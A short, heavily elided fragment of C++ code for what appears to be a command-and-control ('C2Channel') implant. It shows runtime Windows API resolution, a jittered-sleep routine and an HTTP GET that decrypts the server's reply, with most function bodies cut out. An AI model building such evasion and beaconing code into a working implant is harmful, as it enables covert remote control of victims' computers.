...
FARPROC C2Channel::resolve_api(const char* module, const char* function) {
    HMODULE hModule = LoadLibraryA(module);
    return hModule ? GetProcAddress(hModule, function) : nullptr;
}

void C2Channel::sleep_with_jitter(int min_ms, int max_ms) {
...
std::string C2Channel::http_get(const std::wstring& path) {
    ...
    std::string decrypted_data = crypto.decrypt(response, encryption_key);
